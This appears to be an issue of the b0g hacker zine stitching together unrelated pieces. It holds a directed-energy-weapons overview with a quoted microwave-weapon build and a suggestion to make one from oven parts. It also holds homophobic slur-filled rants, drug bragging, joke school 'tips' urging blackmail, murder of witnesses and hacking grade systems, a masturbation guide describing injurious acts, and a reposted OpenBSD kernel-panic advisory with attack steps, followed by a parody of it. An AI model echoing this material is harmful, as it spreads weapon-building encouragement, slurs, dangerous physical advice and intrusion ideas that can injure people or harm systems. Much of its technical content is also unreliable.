In practical HERF circuits one would incorporate a 'double layer'
say by using a capacitor  across which some maximum value of
voltage V(D) might be applied. As the current is made to  exceed
a threshold value I(D), a voltage drop V(D) occurs across the
capacitor up to the  current I(ex) when it explodes and disrupts
the current.

When switched on, the current increases at rate:

dI/dt = (V(b) - R I/ L)

(V(b) is intrinsic emf of circuit)

Without the 'double layer' (capacitor) it reaches saturation at:

I(s) = V(b)/ R

If I(D) < I(s) uts rate of increase for I > I(D) is given by:

dI/dt = [V(b) - V(D) - RI]/ L

The current will tend towards a saturation value:

I(s)' = [V(b) - V(D)]/ R

If I(ex) < I(s)' the double layer will explode before saturation
value is reached.

The explosion will generate a high-energy radio frequency pulse.


High Powered Microwave weapons (HPM)

The advantage of HPM weapons is that it is very powerful and can
have a very long range. The basics of HPM is that they comprise
of a electrical power source, an RF generator and a antenna, for
beam direction. I have found some information where a engineer
(His name is Richard Boylan to give him credit for this) helped
construct one such weapon:

"The HPM demonstrator we built consisted of basically two
sections. A so-called Marx generator, which produces a very
brief, very high voltage, high current pulse, and a
magnetron/antenna assembly, which converts the pulse current
into an intense burst of microwave energy and then directs it
towards a target. The demonstrator was housed in a trailer which
had its own 15 kW diesel generator, and they used to tow it out
to the desert to test it. The testing was done at the Cibola
Range of the Yuma Proving Ground near Yuma, Arizona.

A commercial 100 kV DC power supply was used to charge the
20-stage Marx, where it charged its capacitors in parallel, and
then via a series of spark gaps discharged them in series. With
the power supply set to 27 kV, the Marx would output a 265 kV,
3500 ampere, 21.4-nanosecond pulse. The spark gap array was
pressurized with air, and the air pressure was regulated so as to
control the point at which the Marx would fire. This allowed the
system to operate over a range of output power levels. One
megawatt was a typical pulse-power output, and with typical 50%
magnetron efficiency, a half-megawatt RF pulse could be achieved.

The negative-polarity output pulse from the Marx was coupled to
a large, cold-cathode magnetron tube equipped with a
super conducting magnet. The magnet was cooled to super conducting
temperatures by liquid helium, and the magnetron itself was
evacuated by a small vacuum pump. A specially-designed magnet
power supply (1 volt, 70 amperes) was used to energize the
magnet assembly. A wave guide couples the resulting microwave
energy (4.4 GHz) to a 10-foot diameter dish antenna, which was
mounted several feet above the trailer. Precautions were
necessary around the operating equipment to protect personnel.
Strong magnetic field, X-radiation from the magnetron, and RF
hazard from the antenna all had to be considered. A zone of
"denied occupancy" was set up in front of the antenna, which was
basically a 12-degree cone which extended some 800 meters out in
front of the antenna. The most intense part of the beam occupied
a 6-degree angle, and in the center of the beam at a range of
30.5 meters, 9.85 watts per sq cm was developed."

The results of the test he described as impressive, with the weapon
totally destroying laptops, wrist watches and an army land mine at
a distance of two miles.

Though I have no idea if this testing was real and if the HPM weapon
if build the way it is described would work, though its construction
sounds about right. You must also keep in mind that this
construction and testing was supposedly have taken place between
1987 and 1989, so HPM technology will have moved on considerably
since then. I reckon you can probably build a decent short range
microwave weapon by stealing a few bits out of some microwave ovens
and adding a few extra bits, though the is still the hazard of
radiation from the magnetron tube and high voltages.

The first half of the weapon is a Marx generator or a variant of it,
you can build one of these quite easily and the are many free
example picture and circuit diagrams that you can download for free
on the internet. Though you most probably the rest I have no idea
though you might want to raid you're saving account. (still can you
make toast from a mile away? That's what I want to know)
Of course these are still high powered microwaves you are dealing
with. Some warning signs that you are being exposed to high levels
of microwave radiation include:

1. You feeling warm/hot.

2. You going suddenly blind (the tissue in you're eyes being
    destroyed)

3. Extreme pain (at high levels)

4. Death


The Threat

Most countries military now harden their equipment against this
threat. As flux bombs I believe were used in the gulf war to knock
out enemy weapons and equipment.
But how long is it before terrorists get there hands on RF weapons?
Probably not that long now (if not already), I can see The IRA and
Basque terrorist (or political solders as they prefer to be called)
as well as organized crime will probably start using these types of
weapons within the next 10 years yet our governments (both British
and American still do not see the need to hardening civilian
critical equipment against this threat. For example  what would
happen if one of these weapons was used on a commercial jet, or to
hose a major financial district by some terrorist or criminal
organization!?! (just had to put some FUD in there to keep
interesting)


Shielding

Shielding is relatively inexpensive these day and if you would like
more information on   shielding you're equipment see at article
at:  http://www.infowar.com called hardening you're assets, which
explains ways to protect against these type of weapons as well as
how to make you're computer and equipment EM-Secure  (or TEMPEST
hardened as it is commonly called).


High energy LASER (HEL)

Laser stands for 'Light Amplification by Stimulated Emission of
Radiation' and everyone knows what a laser is, well unless they have
been in living in a cave or something for the last 35 years.
Most people have seen lasers that are used in cutting and for surgery
but what most people don't know is that the US military has laser
weapons powerful enough to shoot down missile and knock satellites
out of orbit. the advantage of laser defenses over missile defenses
is that (obviously as light travels very fast) you can't run form a
laser, so as long as its targeting system is accurate it will hit the
target. Currently the US army is developing the THEL (tactical high
energy laser) for mobile surface to air defenses.
The US military has is also developing laser weapons to blind the
target (Electro optic countermeasures or EOCM), mind you, you can
already do this to people driving cars with a laser pointer.


Particle beam weapons

Basically particle beam weapons are a bit eleet and not something you
can muck around with in you're back yard. A particle beam weapon
Basically fires a stream of charged protons a certain distance. The
cool thing about particle beams though is that the beam can pass
through other objects (mainly air usually) with it only loosing a
small amount of energy, but when it finally slows down to a certain
speed, the particles will start hitting the atoms in the area (in the
air usually) which knocks electrons off and makes a mess, creating a
area of plasma. This plasma is not that useful for much though, I
don't thing it would do that much damage to a aircraft, sure it would
hurt people, but a bullet would do a much better job. The only good
reason for the development of this kind of weapon is for electronic
counter measures as the ball of plasma would probably give a good
radar return quite well and would most probably create enough heat
for heat seeking missiles to be fooled by it. If you want to see
a particle beam in action, pop down to Area-51 as they sometimes test
them there, look out for the plasma moving around about a mile above
the test area.


Well that's my quick round up of some DEW (directed energy weapons),
the are many other directed energy weapons being developed but most
of them are too l33t for me :(

Exactly WHY b0g is elite

OK, so your fucking readers are thinking what the fuck tak, your a homo,
if so...that is one reason im a ninja. 

b0g.org is the most pimptacular place on the net with coolest people
around.

The name one represents deep morality, and inner peace wiht society, while
infact making anyone in the b0g-path look like fucking morons.

This 'brotherhoof of gimps' society is one of true onteligance, and to
produce such articles of elitness takes pure skill. b0g is a place where
anyone can come, and be themselves...that in itself represents pure
satisfaction to the body, becoming one with the universe.

now, why everyone else is not elite

cDc: Cult of the Dead Cow is a bunch of flaming homosexuals. They code
'Network Administration Tools' in Visual Basic, and release them to the
public, trying to make themselves look 'cool' sheesh! Last couple years at
defcon, they have displayed uberly-LAME acts of...STUPIDNESS... but when
your IQ equals [your weight+height+showsize DIVIDED BY ZERO] then jumping
around in monkey-wear is ok. The truth is cDc makes themselves look like
flaming idiots, and when people as chill as b0g come around, it makes the
cDc scene look even gayer. 

DOC: Dis.Org Crew...what can i saw about them, other than those fags from
San Francisco are infact flaming homosexuals, and they clearly admit
it. DOC is run by Pete Shipley, the lead fag of the century. These guys
have 0-skill, and walk around wearing treachcoats to hide their fat ass's
[state of mind really, nothing can hide that shit] They liek to wear black
clothes, cause the only respect they can get if from 12 year old groupies,
who are afraid they will be squashed by the tub-o-lard DOC losers.

for a bit now, but they associate with the losers at dis.org =\ 
You guys are pretty lame, but that whole 'tubthumping' non-embeded style
must get all the girls.

AntiOnline/AntiCode: Hi, my name is jp, im a fag. I run a ghetto server,
and think im cool, cause i wear bright pink clothes.
AntiCode is a exploit/tools web page, is it not? Yet the layout is a
representation of a default directory listing...Yet its not, its a wannabe
one, cause he thinks its cool. =\ The problem with this is you are useing
lynx to bust out some shit, and what do you get? A whole clutter of SHIT
and after about 3 hours of searching through stuff you don't need, you
find what you do need, and you must select it 5 times to get through the
shitloads of redirections, and [ads?] heh... theres alot more, but that
joints to lame to talk about.

Just a few corrections for stuff said in issue 8 of b0g
By Wizdumb <wizdumb@leet.org>

Okay. First things first. About Bill Gates being Satan. Let me start by
converting "Bill Gates III" into ASCII, as said in the article...

B = B
I = I
L = L
L = L

G = G
A = A
T = T
E = E
S = S

I = I
I = I
I = I

Perhaps he meant decimal, not ASCII. Oops. :) Also, how does he get those
last three III's to have a value of 1 each? Fuq gnoze.

But it doesn't matter. I have a way more profound discovery. The number of
Satan is in fact *not* 666, but 568. Why?

s = 115
a = 97
t = 116
a = 97
n = 110
! = 33

115 + 97 + 116 + 97 + 110 + 33 = 568

The exclamation mark, of course, is vital when reffering to any powerful
deity, as anyone would know. And thus, I present you with the *true*
number of Satan - 568.

Now you may be thinking that I was simply going to give you a more accurate
representative number for Satan and then leave you, but you are mistaken. 
My
revelation is set to go much further than that...

Let's look at the decimal value of my handle...

W = 87
I = 73
Z = 90
D = 68
U = 85
M = 77
B = 66

87 + 73 + 90 + 68 + 85 + 77 + 66 = 546

568 = satan!
546 = WIZDUMB

Looks fine so far, but add the decimal value of SYN (22) and...

"WIZDUMB" + (SYN) == "satan!"

And so, I can conclude, that given my many sins (syns?) in the past - I 
have
become Lucifer himself - sent down to earth to devirginize children and
blow up postboxes. I am the dark lord incarnated, and there is no stopping
me. Sooooooo HAH!

And since I (Satan, Wizdumb, whoever) am on this whole trip of correcting
last months issue, let me also note a minor mishap in MagicTux's article
regarding UNIX password files...

OpenBSD uses Blowfish for its password file, but BSDi and FreeBSD by 
default do
*not*. They can use DES or (much better) MD5 out-of-the-box, but won't be 
able
to use Blowfish without a fair amount of system hacking.

Next correction - In Trionix's article on smoking weed...

"iii) Remember the Golden Rule kids! DON'T COUGH!!!"

Totally wrong, y0. Coughing will give you away as a non-hardened weed-
smoker,
but will also open up areas of your lungs that aren't used normally, and 
thus
get you more wasted than usual. :)

Now time for some additions - on Wh0rde's weed article. Purple weed is 
*not* a
myth - I have seen and smoked it. Also, here in South Africa, there is a
native strain which has a hell of a lot of *brown* in it - it looks as if 
it
was cut with tobacco, but having grown the shit myself, I *know* it aint. 
:)

And speaking of my growing, why not check out the pictures of the crops
at the commune my brother used to stay at? They'll give you a good idea of
what South African weed is like...

http://home.global.co.za/~satur9/dagga-01.jpg
http://home.global.co.za/~satur9/dagga-02.jpg
http://home.global.co.za/~satur9/dagga-03.jpg
http://home.global.co.za/~satur9/dagga-04.jpg
http://home.global.co.za/~satur9/dagga-05.jpg
http://home.global.co.za/~satur9/dagga-06.jpg
http://home.global.co.za/~satur9/dagga-07.jpg
http://home.global.co.za/~satur9/dagga-08.jpg

"Dagga" is Afrikaans for marijuana, and the "gg" is this horrible guttural
sound that you won't find anywhere in English. If you know any German or
Dutch or Flemmish or something - then pronounce it as you would in that
language. If you don't speak any Germanic languages - make a sound like
yer hocking a loogy - it's summing like that.

The strain pictured in the above images is a "Swazi" substrain - a light,
trippy, highly resinous, sweet smelling strain. Beautiful stuff. I don't
know if Swazi is available in other countries, but Durban Poison (another
native South African strain) seems quite popular, and with Malawi - I'm
not sure.

The other main difference with the weed here is price. There are two main
factors that have contributed to this...

1) It grows naturally here - it aint anything special
2) It was smoked by the tribes native to our country long before us whiteys
   rocked up - and is to this day. Greater demand - Lower price.

If you have the right contacts here in SA, you can pick up a jiffy bag full 
of
A-Grade Swazi for R40 (about $6 or 4 pounds). You can get a bank bag of
not-particularly-wonderful stuff for R10 (about $1,50 or 1 pound). There is
also a huge shipment of Northern Lights imported from Amsterdam which is
currently floating around here, which will cost ya R70-R100 depending on 
how
close you are to the importers.

Fuq I'm getting digressed. This is what happens when ya get me talking
about weed. Okay. I'm shutting myself up right now before I hurt
myself. (I have my matric finals coming up and won't be smoking weed or 
taking
MDMA or anything for *2* months, which is gonna kill me :/) Oooh, but then
again, after my finals, I'll be smoking weed again after 2 months of 
sobriety,
when I'm used to smoking it daily - and THAT is gonna kill me. :)

Aight. Later...

Here are some _very_ useful hints on how to
stay out of trouble and get good grades in 
school. 

Newbie note:
US:
A is the best grade
F is the worst grade 

Europe:
1 is the best grade
6 is the worst grade

Oh, and by the way:
http://www.fbi.gov/programs -- 0wned ];-> 

1.)
     Don't beat people up. If you do beat people
     up and get sent to the principal, then react
     as the following explains.

      a) 
         Problem:
          The guy you beat up points at you and says
          "He started!".
         Solution:
          Say something like "Even though I know this is
          wrong what I'm saying, I will admit that I started
          it, to keep the principal from having to make a
          heavy decision. May God forgive me for lying."   

      b)
         Problem:
          The guy has proof that you beat him up ... and
          that you started it. 
         Solution:
          Beat him up again and destroy all evidence ...
          including witnesses. See, if you kill the principal
          nobody will ever find out what happened. Oh, and then
          of course blame it on the guy you beat up.
     
      c) 
         Problem:
          The guy says something like you were supposed to say
          in a). 
         Solution:
          That guy is cool and reads b0g. Leave him alone and
          beat the principal up together with him.


2.)
     Don't take drugs in school. You might get caught and they'll
     tell your parents. This also goes for smoking and alcohol.
     Just don't do it and you'll be out of trouble. If you do
     decide to smoke some pot or something and you DO get caught,
     then try one of the following.
      
      a) 
         Start crying and say something like 'I didn't want to,
         but <insertnameofsomeassholehere> forced me to.'
      
      b) 
         Start crying and say something about your parents getting
         divorced and you being under great psychological pressure.
      
      c)
         Offer the principal or whoever you got sent to some of 
         your pot. When he's high ... RUN FOR IT!

      d) 
         This guy in the park next to the school came, tied you to
         the bench and stuck a joint in your mouth. They'll believe
         it. If they ask what you were doing in the park, once again
         RUN FOR IT!

      e) 
         Say you that it was incense and never wanted to take drugs
         cause they are bad. 

      f) 
         If that person you got sent to smokes, tell them how bad
         smoking is and give them the 10 billion reasons why pot is
         healthier than cigarettes. (see some other b0g)


3.)
     Always do your homework! This will get you good grades in school.
     If you "forget" to do your homework, try the following.
     
      a)
         One of your 2 billion relatives died. Just remember to keep
         track of which of your relatives already died. They tend
         to get suspicious, when your dad dies for the fifth time.

      b)
         See b above.

      c)
         Be honest. Newbie note: I don't recommend to try this one,
         cause it will get you really unpopular and the teachers will
         give you bad grades. But at least you manage to stay out of
         trouble this way.

      d) 
         Tell them about some dudes from the Russian Mafia coming and
         taking you to Moscow. You just got released last night 2 AM
         and you are still very taken away. If they don't believe you,
         tell them to read the newspaper. If they get out a newspaper
         then .... RUN FOR IT!

      e) 
         Sidetrack'em. Bring up some new topic that the teacher likes
         and act like you're interested. This will keep them from
         checking for homework.


4.)
     Never tell anyone about your great computer skillz (unless you
     wanna impress some hot chick). To avoid being a hacker and
     having your parents called, do the following.

      a)
         Don't type fast. Anyone that can type fast is a "hacker".
   
      b)
         Pretend you don't know how to do a double-click.
      
      c) 
         Haxor your computer's network. If they actually are stupid
         enough to keep the student's grades on the computers (which
         I highly doubt), then this is another way of getting good
         grades. 

         If you don't get what I mean with that, you shouldn't be reading
         this.


5.)
     Be a teacher's pet. 
     Newbie note: This will get you very unpopular.
     To be a teacher's pet, try the following.     

      a) 
         Always do your homework.

      b) 
         Always agree with the teacher.

      c) 
         Use high-vocab language.

      d)
         Tell the bad kids to be quiet.

      e)
         Pretend like you're eager to learn.

      f)
         Always smile at your teachers

      g)
         Join the Boy Scouts! 


6.)
     Be smart. 
     I don't really recommend this one, cause it's so boring and requires
     almost no skill. To be smart you'll be like this. I tried this a 
     while. It gets you quite unpopular and teachers start liking you 
     (yuck!).

      a)
         Always know the answer to every question.

      b)
         Always doing your homework (FAST!!!)

      c) 
         Be a total bitch.


7.)
     Don't be "mean" to your teachers.
     
     Example: 
      During French with my 120 year old lesbian transvestite french 
teacher
      in a vocabulary test, she dictates "You are stupid". I write down 
      "tue bete" cause I'm like extremely intelligent. Then I get pissed 
and
      say, "Thanks, you too, bitch". She didn't really like that and sent
      me to the principal. 
      So, don't make stupid mistakes like that one.


8.)
     Blackmail your teacher(s). This will guaranteedly get you good grades
     and it's like the coolest thing you can do. You'll get popular and you
     can mess up in school as much as you want. Also, your parents will be 
all
     proud of you :) All you'll need to do, is go up to your teacher and 
say,
     "I know all about your secret". 
     There is a certain risk to it though, here are some  examples of what 
     might happen.

      a)
         The FBI comes and wants to arrest you. 
         This problem is quite easy to solve, just blackmail them.
    
      b) 
         The teacher knows all about your secret. 
         Just say, "Well I know all about your OTHER secret, too".

      c)
         The teacher asks you what her "secret" is. Tell her it's
         too dangerous to say in this room because the FBI is listening.

      d)
         Your teacher doesn't have a secret.
         RUN FOR IT!!!
       
      
9.)
     Fuck your teacher. This will work quite often. Just remember the
     teacher should be of the opposite sex, unless they're gay or lesbian
     or bisexual.
     Also remember to bring a condom, cause your Boy Scouts slogan is 
     "Be Prepared", right? So, your teacher will think you're like totally 
     organized.

     DON'T GET THEM PREGNANT OR YOU'LL BE IN DEEP SHIT!!!

     IF YOU HAVE AIDS THEN DEFINITELY FUCK'EM!!!

     IF THEY HAVE AIDS FUCK'EM ANYWAY CAUSE YOU WANT GOOD GRADES!!!

     STOP SCREAMING!!! 


10.)
     Ok, now we come to the final method. This one is the probably easiest
     and most relaxing one. BLACKMAIL your teacher.  
     Nothing to say about it, this method is just perfect!!!!!!!!!!!!

     Just make sure you have enough money :))))))

Today we will explore the many ways of sexual pleasure, and the many 
talents passed on through many generations of masturbators like myself.  
These trade secretes will substitute a woman for the rest of your life.

*The Art of Talent

Talent Method One:  Typing and masturbating

Have you ever been on IRC, and you just get that 'urge'?  Do people try and 
talk to you while you're in the middle of that 'urge'?  With the help of a 
revolutionary technique, you can chat, and satisfy that 'urge'!

First you need to place your left hand on the keyboard (if you use your 
right hand to masturbate).  Place your pinky on 'f', ring finger on 'g', 
middle finger on 'h', and your index finger on 'j'.  In this position, you 
are now able to reach every key on the keyboard, with a little reach and 
dexterity.  This art form is so useful, I am currently writing this whole 
text with one hand, (I’m sure you don't care to hear what the other hand is 
doing right now).  

Talent Method Two:  Snow Writing

Picture this scene, wintertime, no body is looking, and you gotta take a 
piss.  With a little practice you can write "Tiller RAWKS!!" with your 
writing utensil (penmanship and eligibility vary according to size).  The 
trick is to write in cursive, some inexperienced wannabe's try and print, 
causing pain to the urethra, as they have to hold it for the next letter.  
Another common mistake is the act of masturbating while trying to piss.  
Although you satisfy two 'urges' with one act, you also get sloppy 
handwriting, and piss all over your leg.

Talent Method Three:  Late Night Homework

Have you ever had to stay up late on night to do your homework?  I'm sure 
it's happened to all of you.  And I’m sure you've gotten exited doing 
Algebra (thinking of your 80 year old teacher) and just wanted to yank it, 
and finish your homework in the morning.  It's happened to all of us, don't 
be ashamed, cept my teacher is a FOX.  With the invention of a new pen (the 
one that makes squiggly marks, and vibrates) you can yank it harder than 
ever and still have neat handwriting, only to find out that 2(25x + 3x) 
does NOT equal 5ex.

The whole trick is timing, and consistency.  If you can perfectly time the 
up and down motion of the pen, and integrate the movements of your hand to 
the pen, your body movement will counteract with the motion of the pen, 
causing the neatness of your writing.  Common mistakes have risen with the 
invention of this revolutionary pen.  Some individuals use the pen as a 
vibrator, inserting it up their anus, causing the malfunction of both their 
rectum and the motor of the pen.  (I'll illustrate the correct way to 
masturbate with the pen later).  

*Techniques of The Master Himself

Technique One:  Frigid Air

Using the proper household items, you can implement prestige technique, and 
practice, to be used on the first chick you see.  Here i will demonstrate 
the Frigid Air technique, developed by myself, with the thoughtful idea by 
bads3ctor.  Have you ever wondered why they put those ruber edges on the 
doors of refrigerators?  Well... now you know.  First, open the fridge; 
next place your penis in the crack of the door, shutting it (GENTLY) and 
start pumping.  Be aware that any jizz squirting out, WILL spoil food, so 
aim left of the leftovers.  

For the advanced level of masturbators, pull up a chair, and use the 
freezer.  This adds to the challenge.  If you aren't careful, sperm will 
act as glue, painfully sticking the head of your penis to the metal part of 
the door.  If this happens, DON'T JUMP DOWN FROM THE CHAIR!!  Calmly refer 
back to this text for further instructions, because if you don't follow 
this exactly, you'll never have children again.  Oh, did i forget to 
mention, if this happens, your fucked, and i have pity on your soul.  I 
guess all i can really suggest is that you try and lick it, not that that 
would help any, but that would be fucking hilarious if you where caught 
with your tongue, and dick stuck to the freezer door.

Technique Two:  Base

The base method developed by Bose (maker of Bose speakers).  He theorized 
that by turning up the base to your favorite song increases the amount of 
pleasure.  Logically, the vibration of the speaker would guarantee a double 
orgasm.  First pick out a cd, press play, turn the base on full blast, and 
cut a hole through the cloth of your speakers.  Now ram it inside, and 
enjoy.

The advantage of this method is the stealth, incorporated with the loud 
noise of the stereo.  A common mistake made by many young individuals is 
turning it up WAY too high, causing parents to come in your room to tell 
you to turn it down.  Or causing the neighbors to call the police, forcing 
them to bust down the door, cause you can't hear them knocking and yelling 
your name.  This can become a sticky situation.  On another note, the 
sticky substance that is ejaculated can cause the short out of an expensive 
speaker.  Please masturbate with caution.

Technique Three:  Vibrating Pen

The vibrating pen, making it's second appearance in this text today, is a 
very useful tool.  Some kindergartners underestimate the power of 'the 
pen'.  If only they knew, it could get them laid with their teacher, then 
the pen would be a revolutionary tool to get A's in ALL your classes.  But 
for now, we're just going to illustrate the purpose of self-pleasure.  As 
you've all read in my first GTMHM, the Brown Finger Fist Action was a 
popular one amongst the many readers.  In this method, we advance on the 
Brown Finger Fist Action.  By sticking the pen up your anus and 
masturbating at the same time, you will achieve top orgasm, screaming your 
lungs out cause it feels soooooooo goooood.  The trick here, so not to ruin 
the motor, is to use protection.  Any form of protection can be used here, 
cept for birth control pills.  If you don't have a rubber with you right 
now, you may use a zip lock as a substitute.  Although, don't use the 
vegetable ones.

*** You could go to jail warning:  Don't go to wall-mart, rip the pen out 
of the package, and start using this method.

*** Your already in jail tip:  if you go to jail, stick this up your cell 
mates anus, and jack him off, you'll be idolized amongst the cell mates in 
prison.  You might be let out early if you do good with the prison 
officers.


Technique Four:  Caffinated Pepsi

The caffinated pepsi method...  some have tried and failed, but I’ve 
revolutionized the technique.  The whole theory revolves around the fact, 
"no pain, no gain."  Back when they first invented aluminum cans, little 
boys have tried cutting holes in the can, and try to satisfy that 'urge'.  
You wouldn't believe that some still do it to this day.  But if you make 
just one slit, and fold the flaps to the side, you can get some real 
pleasure.  Or, if you are diameterly challenged (iny winny, tinny winny, 
short, short cock) then you can just use the hole at the top of the can 
(hopefully this will finish off what nature started, but never finished).  
Another method revolving around the aluminum can, just fold it, and ram it 
in between the crack.  This gives you a tight sqeeze without the sharp 
edges.

Technique Five:  CD

The CD method, basically uses the CD drive.  If you open your drive, lay 
your dick on the tray, and keep pushing that button.  Some young 
inexperienced kids try and use the floppy drive, but it just doesn't have 
the same effect.  I've also heard accounts of people sticking their cock in 
that huge hole on the tray and pressing the button.  They were later rushed 
to the hospital where the doctors finished amputating what was left.


*Fun and Games

As I said in my previous GTMHM, I would discuss the fun and games of 
masturbating.  Well here you go, special demand for all you readers.

Fun and Games One:  Shoots and Ladders

Shoots and Ladders is not the ordinary board game that you used to play in 
elementary, now its a time old tradition, played in highskewl, and college.  
All you need for this game is a volunteer (preferably a chick) for each 
player, and a ladder.  The object of the game, to reach the top first.

Rules:  Each player must have a team member; you advance one step on the 
ladder by having the other team member catch your ejaculated sperm in their 
mouth.  Starting from the bottom step, advancing in turns (I suggest just 
having two teams.  3 teams crowds the bottom of the ladder, although, 
that'd be fun, trying to stay on, and jack off at the same time, h0h0).  If 
you fall off the ladder for any reason (no pushing) then you have to start 
all over again from the very bottom.

***Tip: if your team member is a chick, she can strip for you, making it 
quicker to ejaculate.

Well... in conclusion, we've discussed the many ways of self-pleasure, as 
well as the many talents that always come in handy.  I've also introduced 
you to a great party game.  If you come up with any other games, or already 
have some traditions along those lines, email me tiller@cyberspace.org

May the force be with you

What follows are two entries found at bugtraq. The first posted as an advisory 
by none other then the infamous Rloxley himself. Not only did this advisory 
outrage and stir up a riot among the leet OpenBSD gimps, but it also led to some 
rather funny responses. The second is a post made by some gimp who totally owned 
him, in fact its so funny I had trouble breathing for the rest of the day at 
work.

Rloxley claims this first post was spoofed by some lamer who wanted to make him 
look silly. And since b0g are listed in the “to hell with you” section that 
surely helps to back up Rloxleys claim of innocence, since Rloxley is in fact a 
true b0g fan and would never hurt our feelings like that. Nevertheless this is 
one hella funny read.

Section 1 [Greets]:

	First and foremost, thanks to team hackphreak and SSG, great job!
	SSG helped during the researching of the bug (bind, aempire, cripto).
	This was a coordinated effort with Team Hackphreak and The Hacker
	Collective known as SSG.

	I would like to thank RootShellHackers and Team ZSH for rigorously	
	testing on many freenets :] (ratcorpse and her great mass testing
	scripts, great for analysis: www.sneakerz.org/~rat < great site :)

	I would like to thank caddis of TESO. He started the whole OpenBSD
	war. Keep up the good work.

	Special thanks to Mixter and his TFN2k. It has made my job much
	easier.

	I would also like to thank: EHAP, Condemnation, gov-boi (hack.co.za),
	shinex (yf0rce :), ISS, Solar Designer, #hackphreak, #darknet, 
	#!/bin/zsh, #condemnation, #conf, Al Hugher, Aleph1, and my parents.


Section 2 [Preface]:

	Usually Team HackPhreak keeps our code and research quite private
until we give lectures in our channel on undernet (#hackphreak). But what
really annoys us, is when a very big figure in the security community acts
disrespectful to the people who help build this internet infastructure. This
person who I speak of, is Theo de Raadt. Theo de Raadt claims that OpenBSD 
hasn't experienced a local root hole in the default install for many years.
During his internal security audits, they find many bugs, yet they just 
hide them, patch them, and never notify the public. This is very unethical
on the part of the OpenBSD team. I think you guys are lame. What worrys
Team Hackphreak, is how many other bugs have gone unnoticed. We have found
many other exlpoitable holes in previous OpenBSD distributions, that have 
miraculously been patched and never revealed. Next, there is the "Three 
years without a remote hole in the default install". I hope this advisory
breaks that aswell, because, technically:

	* Log into the remote host
	* Grab our exploit
	* Crash the kernel

	This bug is also be exploitable via NFS.

	Three years without a remote hole? Strike that.


Section 3 [Background]:

	UVM is a new virtual memory system developed which is currently
used in the OpenBSD Operating Systems. It is significantly better than the
traditional MACH based VM.


Section 4 [Problem Description]:

	There exists a bug in the UVM code which has blatently slipped passed
the seemlessly small minded OpenBSD security auditors. The bug exists in the
anonymous mapping code in UVM. This bug allows for any local user (or remote
user) to crash the entire OpenBSD system, rendering it completely useless. 
Once the system has crashed, a local user (with access to the terminal) may
in fact hack the system. The system drops into DDB (man it). DDB allows for
debugging of the actual kernel. When one has access to the kernel, they can
do most anything: such as reading disk buffers, reading _copyright, reading
network mbuf's. So this scales to a most incredible attack, not just a DoS
(if you have read through this you have now more reason to switch to Linux).

	A very smart attacker will:
	
		* Crash the kernel
		* Assume the location of the box which crashed (@ the colo)
		* Use DDB to gain god status

	A layout of the crash dump is given:

		* trap()
		*  uvm_fault()
		*   uvmfault_amapcopy()
		*    amap_copy()
		*     amap_alloc()

------------------------------------------------------------------
struct vm_amap *
amap_alloc(sz, padsz, waitf)
        vaddr_t sz, padsz;
        int waitf;

/*
 * amap_alloc: allocate an amap to manage "sz" bytes of anonymous VM
 *
 * => caller should ensure sz is a multiple of PAGE_SIZE
 * => reference count to new amap is set to one
 * => new amap is returned unlocked
 */

{
        struct vm_amap *amap;
        int slots, padslots;
        UVMHIST_FUNC("amap_alloc"); UVMHIST_CALLED(maphist);

        AMAP_B2SLOT(slots, sz);         /* load slots */
        AMAP_B2SLOT(padslots, padsz);
------------------------------------------------------------------
	
	The kernel crashes in the first instance of AMAP_B2SLOT(slots, sz).

------------------------------------------------------------------
#define AMAP_B2SLOT(S,B) { \
        if ((B) & (PAGE_SIZE - 1)) \
                panic("AMAP_B2SLOT: invalid byte count"); \
        (S) = (B) >> PAGE_SHIFT; \
}
------------------------------------------------------------------

	Basically, if the (sz & (PAGE_SIZE-1)) is true, the kernel 
panic()'s. Not so cool Mr. Theo, my grandmother wouldn't even have 
done something so stupid and all she has is an A+ and CCNA!

	As aempirei, bind, and cripto pointed out: Even if AMAP_B2SLOT()
is patched, the bug will still exist, hence forth because later
on down the yellow brick road, the kernel will crash in routines such as:

		* amap_splitref()
		* amap_lookup()

	So a hacker will still be able to obtain root access. No thanks
	to obecian for notifying Theo a wee bit early.

Section 1 [Grits]:

        First and foremost, thanks to dictionary.com, without which I would
        be totally lost in the world of English spelling and grammar.  Thanks
        to my mother who bore me.  This was a coordinated effort with Team
        Leet and The Serious Hackers known as Super Super Good.

        I would like to thank RootShellBadddMothers and Team SSH for
        rigorously testing on many stupid shell providers who don't know
        about the OpenBSD team's secret plans for world domination through
        eleet unknown bugs :] (fatcorpse and her great mass testing scripts,
        great for analysis: www.freshmeat.net < great site :)

        I would like to thank bass of BEER.  He started the whole OpenBSD
        religion.  Keep up the good work.

        Special thanks to obecian and his DoS 3.3 System.  It has made my
        job so easy that I think I should not be paid anymore.

        I would also like to thank: NSA, CIA, FBI, Walls Fargo, WTO,
        Kettutytt, Satan, Dorkex (h0rze :), ISS, Solar Designer, #blowjob,
        #hotsex, #eatshit, #42, #conf, Al Hugher, Alpeh1, communism, the
        US Air Force, OJ Simpson, Semtex, Ebola, George W. Bush, Ralph Nader
        and Jello Biafra.

Section 2 [Preface]:

        Usually, Team Leet keeps our code and research quite private until we
spew our diarrhea all over your computer monitor.  But, what really annoys
us, is when a very big figure in the computer security community lies to the
people who make him who he is.  The person I speak of is Bob Dobbs.  Bob
Dobbs claims that OpenBSD hasn't experienced a local root hole in the default
install for many years.  Yet, during his internal audits, he regularly finds
unfaithfulness to the church, and he never notifies the public.  I think you
guys are lame.  You have demonstrated sins, transgressions, intemperances,
vices, errors, failings, personal faults, indiscretions, lapses, trespasses,
and crimes agsinst man, woman, child, law, nature and god.  What worries Team
Leet is that our servers might be hacked.  We have found many other
exploitable holes in previous OpenBSD distributions, that have miraculously
been patched and never revealed.  Next, there is the "Three years without a
remote hole in the default install."  I hope this advisory breaks that
aswell, because, techinically:

        * Walk up to the machine
        * Turn it off
        * Unplug it
        * Take it with you

        Although we have not confirmed it, we believe this bug is also
        exploitable via NFS, RSH, TELNET, and SSH.

        Three years without a remote hoe? Strike that.


Section 3 [Background]:

        OpenBSD is a vulnerable operating system because it runs on a
computer which can be physically accessed by an intruder.  It is
significantly better then the traditional UNIX based OS.

Section 4 [Problem Description]:

        There exists a bug in the physical universe which has blatently
slipped passed the seemlessly feeble minded OpenBSD developers and
hackphreak.org members alike.  This bug allows for any local user (or remote
user) to steal the entire OpenBSD system, thus rendering it completely
useless.  Once the system is stolen, a local user (with access to the
console) may in fact remove the hard disk.  The system uses a published
standard, FFS.  When one has access to the hard disk, they may use FFS do
most anything: such as reading the disk, and writing to it, not just a DoS
(if you have to read through this you have now more reason to switch to
CP/M).

        A very smart attacker will:

                * Mount the hard disk
                * Read from it
                * Use RSH

